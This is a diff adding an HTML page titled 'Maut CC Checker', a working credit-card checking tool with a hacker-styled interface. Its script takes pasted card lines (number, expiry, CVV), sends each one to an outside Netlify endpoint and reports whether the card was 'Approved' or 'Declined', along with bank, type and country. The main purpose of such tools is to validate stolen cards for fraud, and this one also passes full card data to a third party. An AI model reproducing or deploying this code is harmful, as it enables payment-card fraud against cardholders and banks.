@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Maut CC Checker</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      background-color: #000;
+      color: red;
+      font-family: monospace;
+      padding: 10px;
+      text-align: center;
+    }
+
+    h1 {
+      border-top: 2px solid red;
+      border-bottom: 2px solid red;
+      padding: 10px;
+      font-size: 18px;
+      color: red;
+    }
+
+    textarea {
+      width: 95%;
+      height: 140px;
+      background: #111;
+      color: #0f0;
+      border: 2px solid red;
+      padding: 10px;
+      font-size: 14px;
+      margin-bottom: 10px;
+    }
+
+    button {
+      padding: 10px 20px;
+      background-color: red;
+      color: white;
+      border: none;
+      font-weight: bold;
+      font-size: 15px;
+      cursor: pointer;
+      border-radius: 5px;
+    }
+
+    #result {
+      margin-top: 20px;
+      text-align: left;
+      background: #111;
+      padding: 10px;
+      border-radius: 5px;
+      color: white;
+      font-size: 14px;
+      max-height: 400px;
+      overflow-y: auto;
+      border: 1px solid #333;
+      width: 95%;
+      margin-left: auto;
+      margin-right: auto;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>⎯⎯⎯⎯⎯⎯⎯   CC CHECKER   ⎯⎯⎯⎯⎯⎯⎯</h1>
+
+  <textarea id="ccInput" placeholder="Enter CCs like:\n5291318880750222|10|2029|426"></textarea><br>
+  <button onclick="checkCCs()">🧠 Start Checking</button>
+
+  <div id="result">[〄] Results will appear here...</div>
+
+  <script>
+    function formatTime() {
+      const now = new Date();
+      return now.toTimeString().split(" ")[0];
+    }
+
+    function formatCC(cc) {
+      let parts = cc.split("|");
+      return {
+        card: parts[0].replace(/(.{4})/g, "$1 ").trim(),
+        mm: parts[1],
+        yy: parts[2],
+        cvv: parts[3]
+      };
+    }
+
+    async function checkCCs() {
+      const input = document.getElementById("ccInput").value.trim();
+      const lines = input.split("\n").filter(line => line.trim() !== "");
+      const resultDiv = document.getElementById("result");
+      resultDiv.innerHTML = "";
+
+      for (let line of lines) {
+        const cc = encodeURIComponent(line.trim());
+        const info = formatCC(line.trim());
+
+        resultDiv.innerHTML += `⎯⎯⎯⎯⎯⎯⎯   CC CHECKER   ⎯⎯⎯⎯⎯⎯⎯<br>`;
+        resultDiv.innerHTML += `[〄] Card: ${info.card}<br>`;
+        resultDiv.innerHTML += `[〄] Expiry: ${info.mm} / ${info.yy}<br>`;
+        resultDiv.innerHTML += `[〄] CVV: ${info.cvv}<br><br>`;
+
+        try {
+          const res = await fetch(`https://mautx.netlify.app/.netlify/functions/ccmaut?url=${cc}`);
+          const data = await res.json();
+
+          resultDiv.innerHTML += `[〄] Bank: ${data.bank || "Not Available"}<br>`;
+          resultDiv.innerHTML += `[〄] Type: ${data.type || "Not Available"}<br>`;
+          resultDiv.innerHTML += `[〄] Country: 🌐 ${data.country || "Not Available"}<br>`;
+          resultDiv.innerHTML += `[〄] Currency: ${data.currency || "USD"}<br><br>`;
+          resultDiv.innerHTML += `[〄] Status: ${data.status == "Approved" ? "✅ Approved" : "❌ Declined"}<br>`;
+          resultDiv.innerHTML += `[〄] Response: ${data.message || "Unknown"} [Made by Maut]<br><br>`;
+        } catch (err) {
+          resultDiv.innerHTML += `[〄] Status: ❌ Error<br>`;
+          resultDiv.innerHTML += `[〄] Response: Failed to fetch<br><br>`;
+        }
+
+        resultDiv.innerHTML += `━━━━━━━━━━━━━━━━━━━<br>`;
+        resultDiv.innerHTML += `Checked at: ${formatTime()}<br>`;
+        resultDiv.innerHTML += `━━━━━━━━━━━━━━━━━━━<br><br>`;
+      }
+    }
+  </script>
+</body>
+</html>
